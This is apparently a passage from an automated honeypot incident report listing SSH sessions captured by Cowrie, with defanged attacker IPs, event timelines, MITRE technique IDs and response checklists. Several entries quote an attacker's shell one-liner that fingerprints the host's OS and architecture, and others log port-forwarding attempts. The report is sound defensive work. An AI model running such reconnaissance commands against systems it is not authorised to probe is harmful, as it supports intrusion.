| `2026-07-31 19:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c640f5627fa

| Field | Detail |
|---|---|
| **Source IP** | `222.186.68[.]153` |
| **First Seen** | 2026-07-31 19:56 |
| **Last Seen** | 2026-07-31 19:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:56:37` | `cowrie.session.connect` |
| `2026-07-31 19:56:37` | `cowrie.client.version` |
| `2026-07-31 19:56:37` | `cowrie.client.kex` |
| `2026-07-31 19:56:39` | `cowrie.login.success` |
| `2026-07-31 19:56:40` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.186.68[.]153` to AbuseIPDB if not already reported
- [ ] Block `222.186.68[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b5f2dcb8c4c

| Field | Detail |
|---|---|
| **Source IP** | `106.246.89[.]73` |
| **First Seen** | 2026-07-31 19:56 |
| **Last Seen** | 2026-07-31 19:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:56:45` | `cowrie.session.connect` |
| `2026-07-31 19:56:46` | `cowrie.client.version` |
| `2026-07-31 19:56:46` | `cowrie.client.kex` |
| `2026-07-31 19:56:48` | `cowrie.login.success` |
| `2026-07-31 19:56:56` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.246.89[.]73` to AbuseIPDB if not already reported
- [ ] Block `106.246.89[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0debd253a6ed

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:56 |
| **Last Seen** | 2026-07-31 19:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:56:52` | `cowrie.session.connect` |
| `2026-07-31 19:56:53` | `cowrie.client.version` |
| `2026-07-31 19:56:53` | `cowrie.client.kex` |
| `2026-07-31 19:56:55` | `cowrie.login.success` |
| `2026-07-31 19:56:56` | `cowrie.session.params` |
| `2026-07-31 19:56:56` | `cowrie.command.input` |
| `2026-07-31 19:56:56` | `cowrie.command.input` |
| `2026-07-31 19:56:56` | `cowrie.command.input` |
| `2026-07-31 19:56:56` | `cowrie.command.input` |
| `2026-07-31 19:56:56` | `cowrie.command.input` |
| `2026-07-31 19:56:56` | `cowrie.command.success` |
| `2026-07-31 19:56:56` | `cowrie.command.input` |
| `2026-07-31 19:56:56` | `cowrie.command.input` |
| `2026-07-31 19:56:56` | `cowrie.command.input` |
| `2026-07-31 19:56:56` | `cowrie.command.input` |
| `2026-07-31 19:56:57` | `cowrie.log.closed` |
| `2026-07-31 19:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5601910d402

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:58 |
| **Last Seen** | 2026-07-31 19:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:58:47` | `cowrie.session.connect` |
| `2026-07-31 19:58:47` | `cowrie.client.version` |
| `2026-07-31 19:58:47` | `cowrie.client.kex` |
| `2026-07-31 19:58:49` | `cowrie.login.success` |
| `2026-07-31 19:58:50` | `cowrie.session.params` |
| `2026-07-31 19:58:50` | `cowrie.command.input` |
| `2026-07-31 19:58:50` | `cowrie.command.input` |
| `2026-07-31 19:58:50` | `cowrie.command.input` |
| `2026-07-31 19:58:50` | `cowrie.command.input` |
| `2026-07-31 19:58:50` | `cowrie.command.input` |
| `2026-07-31 19:58:50` | `cowrie.command.success` |
| `2026-07-31 19:58:50` | `cowrie.command.input` |
| `2026-07-31 19:58:50` | `cowrie.command.input` |
| `2026-07-31 19:58:50` | `cowrie.command.input` |
| `2026-07-31 19:58:50` | `cowrie.command.input` |
| `2026-07-31 19:58:51` | `cowrie.log.closed` |
| `2026-07-31 19:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb60144f2c45

| Field | Detail |
|---|---|
| **Source IP** | `222.117.176[.]58` |
| **First Seen** | 2026-07-31 20:00 |
| **Last Seen** | 2026-07-31 20:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:00:23` | `cowrie.session.connect` |
| `2026-07-31 20:00:24` | `cowrie.client.version` |
| `2026-07-31 20:00:24` | `cowrie.client.kex` |
| `2026-07-31 20:00:26` | `cowrie.login.success` |
| `2026-07-31 20:00:27` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.117.176[.]58` to AbuseIPDB if not already reported
- [ ] Block `222.117.176[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f97a31fbdb1f

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]253` |
| **First Seen** | 2026-07-31 20:00 |
| **Last Seen** | 2026-07-31 20:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:00:37` | `cowrie.session.connect` |
| `2026-07-31 20:00:38` | `cowrie.client.version` |
| `2026-07-31 20:00:38` | `cowrie.client.kex` |
| `2026-07-31 20:00:40` | `cowrie.login.success` |
| `2026-07-31 20:00:40` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]253` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f7eb392b56

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 20:00 |
| **Last Seen** | 2026-07-31 20:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:00:43` | `cowrie.session.connect` |
| `2026-07-31 20:00:43` | `cowrie.client.version` |
| `2026-07-31 20:00:43` | `cowrie.client.kex` |
| `2026-07-31 20:00:45` | `cowrie.login.success` |
| `2026-07-31 20:00:46` | `cowrie.session.params` |
| `2026-07-31 20:00:46` | `cowrie.command.input` |
| `2026-07-31 20:00:46` | `cowrie.command.input` |
| `2026-07-31 20:00:46` | `cowrie.command.input` |
| `2026-07-31 20:00:46` | `cowrie.command.input` |
| `2026-07-31 20:00:46` | `cowrie.command.input` |
| `2026-07-31 20:00:46` | `cowrie.command.success` |
| `2026-07-31 20:00:46` | `cowrie.command.input` |
| `2026-07-31 20:00:46` | `cowrie.command.input` |
| `2026-07-31 20:00:46` | `cowrie.command.input` |
| `2026-07-31 20:00:46` | `cowrie.command.input` |
| `2026-07-31 20:00:47` | `cowrie.log.closed` |
| `2026-07-31 20:00:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c7e4311f8f5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 20:02 |
| **Last Seen** | 2026-07-31 20:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:02:42` | `cowrie.session.connect` |
| `2026-07-31 20:02:43` | `cowrie.client.version` |
| `2026-07-31 20:02:43` | `cowrie.client.kex` |
| `2026-07-31 20:02:45` | `cowrie.login.success` |
| `2026-07-31 20:02:46` | `cowrie.session.params` |
| `2026-07-31 20:02:46` | `cowrie.command.input` |
| `2026-07-31 20:02:46` | `cowrie.command.input` |
| `2026-07-31 20:02:46` | `cowrie.command.input` |
| `2026-07-31 20:02:46` | `cowrie.command.input` |
| `2026-07-31 20:02:46` | `cowrie.command.input` |
| `2026-07-31 20:02:46` | `cowrie.command.success` |
| `2026-07-31 20:02:46` | `cowrie.command.input` |
| `2026-07-31 20:02:46` | `cowrie.command.input` |
| `2026-07-31 20:02:46` | `cowrie.command.input` |
| `2026-07-31 20:02:46` | `cowrie.command.input` |
| `2026-07-31 20:02:47` | `cowrie.log.closed` |
| `2026-07-31 20:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0074a608bb8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 20:04 |
| **Last Seen** | 2026-07-31 20:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:04:36` | `cowrie.session.connect` |
| `2026-07-31 20:04:36` | `cowrie.client.version` |
| `2026-07-31 20:04:36` | `cowrie.client.kex` |
| `2026-07-31 20:04:38` | `cowrie.login.success` |
| `2026-07-31 20:04:40` | `cowrie.session.params` |
| `2026-07-31 20:04:40` | `cowrie.command.input` |
| `2026-07-31 20:04:40` | `cowrie.command.input` |
| `2026-07-31 20:04:40` | `cowrie.command.input` |
| `2026-07-31 20:04:40` | `cowrie.command.input` |
| `2026-07-31 20:04:40` | `cowrie.command.input` |
| `2026-07-31 20:04:40` | `cowrie.command.success` |
| `2026-07-31 20:04:40` | `cowrie.command.input` |
| `2026-07-31 20:04:40` | `cowrie.command.input` |
| `2026-07-31 20:04:40` | `cowrie.command.input` |
| `2026-07-31 20:04:40` | `cowrie.command.input` |
| `2026-07-31 20:04:41` | `cowrie.log.closed` |
| `2026-07-31 20:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8697679b3cd2

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-07-31 20:04 |
| **Last Seen** | 2026-07-31 20:09 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:04:47` | `cowrie.session.connect` |
| `2026-07-31 20:04:47` | `cowrie.client.version` |
| `2026-07-31 20:04:47` | `cowrie.client.kex` |
| `2026-07-31 20:04:49` | `cowrie.login.success` |
| `2026-07-31 20:04:50` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a84b3bf4967d

| Field | Detail |
|---|---|
| **Source IP** | `112.30.127[.]9` |
| **First Seen** | 2026-07-31 20:04 |
| **Last Seen** | 2026-07-31 20:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:04:59` | `cowrie.session.connect` |
| `2026-07-31 20:05:00` | `cowrie.client.version` |
| `2026-07-31 20:05:00` | `cowrie.client.kex` |
| `2026-07-31 20:05:02` | `cowrie.login.success` |
| `2026-07-31 20:05:03` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:05:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.30.127[.]9` to AbuseIPDB if not already reported
- [ ] Block `112.30.127[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4ab3c3b389b

| Field | Detail |
|---|---|
| **Source IP** | `196.189.59[.]226` |
| **First Seen** | 2026-07-31 20:05 |
| **Last Seen** | 2026-07-31 20:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:05:22` | `cowrie.session.connect` |
| `2026-07-31 20:05:23` | `cowrie.client.version` |
| `2026-07-31 20:05:23` | `cowrie.client.kex` |
| `2026-07-31 20:05:25` | `cowrie.login.success` |
| `2026-07-31 20:05:26` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.59[.]226` to AbuseIPDB if not already reported
- [ ] Block `196.189.59[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22cea3bd4e9b

| Field | Detail |
|---|---|
| **Source IP** | `71.229.1[.]186` |
| **First Seen** | 2026-07-31 20:05 |
| **Last Seen** | 2026-07-31 20:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:05:31` | `cowrie.session.connect` |
| `2026-07-31 20:05:31` | `cowrie.client.version` |
| `2026-07-31 20:05:31` | `cowrie.client.kex` |
| `2026-07-31 20:05:32` | `cowrie.login.success` |
| `2026-07-31 20:05:33` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.229.1[.]186` to AbuseIPDB if not already reported
- [ ] Block `71.229.1[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db3356457b82

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 20:06 |
| **Last Seen** | 2026-07-31 20:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:06:37` | `cowrie.session.connect` |
| `2026-07-31 20:06:37` | `cowrie.client.version` |
| `2026-07-31 20:06:37` | `cowrie.client.kex` |
| `2026-07-31 20:06:39` | `cowrie.login.success` |
| `2026-07-31 20:06:41` | `cowrie.session.params` |
| `2026-07-31 20:06:41` | `cowrie.command.input` |
| `2026-07-31 20:06:41` | `cowrie.command.input` |
| `2026-07-31 20:06:41` | `cowrie.command.input` |
| `2026-07-31 20:06:41` | `cowrie.command.input` |
| `2026-07-31 20:06:41` | `cowrie.command.input` |
| `2026-07-31 20:06:41` | `cowrie.command.success` |
| `2026-07-31 20:06:41` | `cowrie.command.input` |
| `2026-07-31 20:06:41` | `cowrie.command.input` |
| `2026-07-31 20:06:41` | `cowrie.command.input` |
| `2026-07-31 20:06:41` | `cowrie.command.input` |
| `2026-07-31 20:06:42` | `cowrie.log.closed` |
| `2026-07-31 20:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f901d25e94a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 20:08 |
| **Last Seen** | 2026-07-31 20:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:08:35` | `cowrie.session.connect` |
| `2026-07-31 20:08:35` | `cowrie.client.version` |
| `2026-07-31 20:08:35` | `cowrie.client.kex` |
| `2026-07-31 20:08:37` | `cowrie.login.success` |
| `2026-07-31 20:08:38` | `cowrie.session.params` |
| `2026-07-31 20:08:38` | `cowrie.command.input` |
| `2026-07-31 20:08:38` | `cowrie.command.input` |
| `2026-07-31 20:08:38` | `cowrie.command.input` |
| `2026-07-31 20:08:38` | `cowrie.command.input` |
| `2026-07-31 20:08:38` | `cowrie.command.input` |
| `2026-07-31 20:08:38` | `cowrie.command.success` |
| `2026-07-31 20:08:38` | `cowrie.command.input` |
| `2026-07-31 20:08:38` | `cowrie.command.input` |
| `2026-07-31 20:08:38` | `cowrie.command.input` |
| `2026-07-31 20:08:38` | `cowrie.command.input` |
| `2026-07-31 20:08:39` | `cowrie.log.closed` |
| `2026-07-31 20:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99e942b300b9

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 20:10 |
| **Last Seen** | 2026-07-31 20:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:10:30` | `cowrie.session.connect` |
| `2026-07-31 20:10:31` | `cowrie.client.version` |
| `2026-07-31 20:10:31` | `cowrie.client.kex` |
| `2026-07-31 20:10:33` | `cowrie.login.success` |
| `2026-07-31 20:10:34` | `cowrie.session.params` |
| `2026-07-31 20:10:34` | `cowrie.command.input` |
| `2026-07-31 20:10:34` | `cowrie.command.input` |
| `2026-07-31 20:10:34` | `cowrie.command.input` |
| `2026-07-31 20:10:34` | `cowrie.command.input` |
| `2026-07-31 20:10:34` | `cowrie.command.input` |
| `2026-07-31 20:10:34` | `cowrie.command.success` |
| `2026-07-31 20:10:34` | `cowrie.command.input` |
| `2026-07-31 20:10:34` | `cowrie.command.input` |
| `2026-07-31 20:10:34` | `cowrie.command.input` |
| `2026-07-31 20:10:34` | `cowrie.command.input` |
| `2026-07-31 20:10:35` | `cowrie.log.closed` |
| `2026-07-31 20:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cbfa7accc94

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 20:12 |
| **Last Seen** | 2026-07-31 20:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
